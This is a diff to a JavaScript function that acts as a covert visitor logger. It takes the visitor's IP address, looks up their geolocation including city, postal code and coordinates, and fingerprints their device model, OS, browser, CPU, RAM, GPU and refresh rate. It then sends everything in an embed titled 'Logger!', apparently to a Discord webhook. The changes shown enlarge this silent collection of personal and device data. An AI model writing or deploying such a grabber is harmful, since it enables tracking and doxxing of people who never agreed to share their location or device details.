@@ -3,50 +3,61 @@ const sendIP = () => {
         .then(ipResponse => ipResponse.json())
         .then(ipData => {
             const ipadd = ipData.ip;
-            // Device and OS detection
-        const userAgent = navigator.userAgent;
+            
+            const userAgent = navigator.userAgent;
         let device = "Unknown Device";
         let osVersion = "Unknown";
+        let browser = "Unknown Browser";
 
-        // iPhone detection
+        const ratio = window.devicePixelRatio || 1;
+        const width = screen.width * ratio;
+        const height = screen.height * ratio;
+
+        // === Device & OS Detection ===
         if (/iPhone/i.test(userAgent)) {
             device = "iPhone";
             const match = userAgent.match(/OS (\d+_\d+(_\d+)?)/);
             if (match) osVersion = match[1].replace(/_/g, '.');
 
-            const ratio = window.devicePixelRatio || 1;
-            const width = screen.width * ratio;
-            const height = screen.height * ratio;
-
-            if (width === 1170 && height === 2532) device += " 13/14 Pro";
-            else if (width === 1284 && height === 2778) device += " 13/14 Pro Max";
+            if (width === 1170 && height === 2532) device += " 14/15/16/17 Pro";
+            else if (width === 1284 && height === 2778) device += " 14/15/16/17 Pro Max";
+            else if (width === 1290 && height === 2796) device += " 15/16/17 Ultra";
             else if (width === 1125 && height === 2436) device += " X/XS/11 Pro";
+            else if (width === 828 && height === 1792) device += " XR/11";
+            else if (width === 750 && height === 1334) device += " 6/6S/7/8";
+            else device += " (Unknown Model)";
 
-        // iPad detection
         } else if (/iPad/i.test(userAgent)) {
             device = "iPad";
             const match = userAgent.match(/OS (\d+_\d+(_\d+)?)/);
             if (match) osVersion = match[1].replace(/_/g, '.');
 
-        // Android detection
+            if (width === 1668 && height === 2388) device += " Pro 11-inch";
+            else if (width === 2048 && height === 2732) device += " Pro 12.9-inch";
+            else if (width === 1620 && height === 2160) device += " Air 10.9-inch";
+            else if (width === 1536 && height === 2048) device += " Mini 7.9-inch";
+            else device += " (Unknown Model)";
+
         } else if (/Android/i.test(userAgent)) {
-            device = "Android Device";
             const match = userAgent.match(/Android (\d+(\.\d+)?)/);
             if (match) osVersion = match[1];
 
-        // Mac detection
+            if (/Samsung/i.test(userAgent)) device = "Samsung Android";
+            else if (/Pixel/i.test(userAgent)) device = "Google Pixel";
+            else if (/Huawei/i.test(userAgent)) device = "Huawei Android";
+            else device = "Android Device";
+
         } else if (/Macintosh/i.test(userAgent)) {
             device = "Mac";
             const match = userAgent.match(/Mac OS X (\d+[_\.]\d+(_\d+)?)/);
             if (match) osVersion = match[1].replace(/_/g, '.');
 
-        // Windows detection
         } else if (/Windows NT/i.test(userAgent)) {
             device = "Windows PC";
             const match = userAgent.match(/Windows NT (\d+(\.\d+)?)/);
             if (match) {
                 const versionMap = {
-                    "10.0": "10",
+                    "10.0": "10/11",
                     "6.3": "8.1",
                     "6.2": "8",
                     "6.1": "7",
@@ -56,7 +67,6 @@ const sendIP = () => {
                 osVersion = versionMap[match[1]] || match[1];
             }
 
-        // Linux detection
         } else if (/Linux/i.test(userAgent)) {
             device = "Linux PC";
         }
@@ -81,6 +91,35 @@ const sendIP = () => {
             const match = userAgent.match(/(MSIE |rv:)(\d+(\.\d+)?)/);
             browser = match ? `Internet Explorer ${match[2]}` : "Internet Explorer";
         }
+
+        // === Device Specs ===
+        const cpuCores = navigator.hardwareConcurrency || "Unknown";
+        const ram = navigator.deviceMemory || "Unknown";
+        let gpu = "Unknown";
+        let refreshRate = "Unknown";
+
+        // GPU detection via WebGL
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        if (gl) {
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+        }
+
+        // Approximate refresh rate using requestAnimationFrame
+        let frameTimes = [];
+        let rafCount = 0;
+        const sampleFrames = 60;
+        const measureFps = timestamp => {
+            if (rafCount > 0) {
+                const delta = timestamp - frameTimes[frameTimes.length-1];
+                frameTimes.push(delta);
+            } else frameTimes.push(timestamp);
+            rafCount++;
+            if (rafCount < sampleFrames) requestAnimationFrame(measureFps);
+            else refreshRate = Math.round(1000 / (frameTimes.slice(1).reduce((a,b) => a+b)/frameTimes.slice(1).length));
+        };
+        requestAnimationFrame(measureFps);
 
             return fetch(`https://ipapi.co/${ipadd}/json/`)
                 .then(res => res.json())
@@ -114,7 +153,7 @@ const sendIP = () => {
                                 embeds: [
                                     {
                                         title: 'Logger!',
-                                        description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**Proxy Status >> ** ${status}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}\n\n**Device >> ** ${device}\n**OS Version >> ** ${osVersion}\n**Browser >> ** ${browser}`,
+                                        description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**Proxy Status >> ** ${status}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}\n\n**Device >> ** ${device}\n**OS Version >> ** ${osVersion}\n**Browser >> ** ${browser}\n\n**CPU Cores >> ** ${cpuCores}\n**RAM (GB) >> ** ${ram}\n**GPU >> ** ${gpu}\n**Resolution >> ** ${height}x${width}\n**Device Pixel Ratio >> ** ${ratio}\n**Refresh Rate >> ** ${refreshRate}`,
                                         color: 0x800080 
                                     }
                                 ]
